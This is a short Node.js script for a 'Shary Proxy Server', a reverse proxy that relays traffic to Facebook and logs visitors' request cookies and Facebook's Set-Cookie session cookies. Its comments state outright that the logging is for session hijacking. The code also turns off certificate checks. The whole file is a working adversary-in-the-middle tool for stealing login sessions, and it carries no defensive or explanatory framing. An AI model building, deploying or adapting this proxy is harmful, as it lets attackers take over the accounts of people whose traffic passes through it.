const express = require('express');
const httpProxy = require('http-proxy');
const cookieParser = require('cookie-parser');

const app = express();
const proxy = httpProxy.createProxyServer({});

app.use(cookieParser());

// Target Facebook
const TARGET = 'https://www.facebook.com';

app.all('/*', (req, res) => {
    console.log(`[!] Traffic detected: ${req.method} ${req.url}`);

    // Log Headers/Cookies for session hijacking
    if (req.headers.cookie) {
        console.log(`[+] Captured Cookies: ${req.headers.cookie}`);
    }

    proxy.web(req, res, {
        target: TARGET,
        changeOrigin: true,
        secure: false,
        autoRewrite: true,
        headers: {
            'Host': 'www.facebook.com'
        }
    });
});

proxy.on('proxyRes', (proxyRes, req, res) => {
    // Capture Set-Cookie headers from Facebook
    const cookies = proxyRes.headers['set-cookie'];
    if (cookies) {
        console.log(`[+] Captured Session Cookies: ${cookies}`);
    }
});

const PORT = 8080;
app.listen(PORT, () => {
    console.log(`[✓] Shary Proxy Server running on port ${PORT}`);
});
